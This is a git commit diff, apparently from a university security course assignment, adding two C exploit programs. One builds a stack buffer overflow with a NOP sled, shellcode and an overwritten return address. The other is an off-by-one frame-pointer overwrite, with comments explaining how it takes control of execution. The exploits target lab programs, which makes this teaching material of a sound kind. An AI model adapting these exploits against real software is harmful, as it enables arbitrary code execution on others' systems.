f8a46517ca4cb35ecf3fe9f8729c0df270cff845
Luis Perez <luis0@stanford.edu>
2018-04-11 22:59:10 -0700

    Finished Part 1

--- proj1/sploits/sploit1.c
+++ proj1/sploits/sploit1.c
@@ -9,7 +9,20 @@
 
 int main(void)
 {
-  char *args[] = { TARGET, "hi there", NULL };
+	// 256 bytes is the buffer, 2*sizeof(int) for two params, and 1 byte for
+	// null terminator.
+	char sploitstring[256 + 2*sizeof(int) + 1];
+	// Set all NOP.
+	memset(sploitstring, '\x90', sizeof(sploitstring));
+	// Set final null.
+	sploitstring[sizeof(sploitstring) - 1] = 0;
+	// We don't want shellcode to be null-terminated.
+	memcpy(sploitstring, shellcode, sizeof(shellcode) - 1);
+	// Past the buffer, past ebp, point to eip.
+	int* ret = (int*)(sploitstring + 256 + sizeof(int));
+	*ret = 0xbffffc5c;
+
+  char *args[] = { TARGET, sploitstring, NULL };
   char *env[] = { NULL };
 
   execve(TARGET, args, env);
--- proj1/sploits/sploit2.c
+++ proj1/sploits/sploit2.c
@@ -9,7 +9,42 @@
 
 int main(void)
 {
-  char *args[] = { TARGET, "hi there", NULL };
+	// The exploit is due to the fact that we can overwrite a single byte past
+	// the buffer[200]. This let's us overwrite $ebp, which is copied to $esp
+	// (the stack pointer) once the function returns. The general idea is that
+	// we can therefore manipulate $esp (the stack pointer) so it points to an
+	// arbitrary address. It then pops ($ebp) from the stack, and reads ($eip)
+	// from the stack, which gives us full control.
+
+	// We make the explot one byte (+ null char) too large.
+	char sploitstring[202*sizeof(char)];
+	
+	// Fill with NOOPs and null terminate.
+	memset(sploitstring, '\x90', sizeof(sploitstring));
+	sploitstring[sizeof(sploitstring) - 1] = 0;
+	
+	// The final byte overwrites part of $ebp stored in the stack frame of bar().
+	// By inspecting gdb, we modify this so it points into our buffer, since the
+	// processor will then copy this value to $esp (the stack pointer) and then
+	// pop the value this points to (popping what it thinks is $ebp) and then read
+	// the next value into $eip.
+	// The $ebp value of bar() is 0xbffffd9c, and we want it to be
+	// 0xbffffd8c (buffer[196], storing the address to the shell code) - 0x4 (
+	// since we will pop $ebp before reading). Note all this requires is changing
+	// the last byte.
+	sploitstring[sizeof(sploitstring) - 2] = 0x8c - 0x4;
+
+	// With the manipulated stack, this value now occopies the space of $eip.
+	// We can set it to point directly to the buffer since the buffer will be full
+	//  of NOOP slides to our shellcode.
+	*(void**)(&sploitstring[sizeof(sploitstring) - 6]) = (void*) 0xbffffcc8;
+
+	// We copy the shellcode into the buffer, minus the null-terminal.
+	memcpy(&sploitstring[sizeof(sploitstring) - (sizeof(shellcode) - 1) - 6],
+				 shellcode, sizeof(shellcode) - 1);
+
+
+  char *args[] = { TARGET, sploitstring, NULL };
   char *env[] = { NULL };
 
   execve(TARGET, args, env);
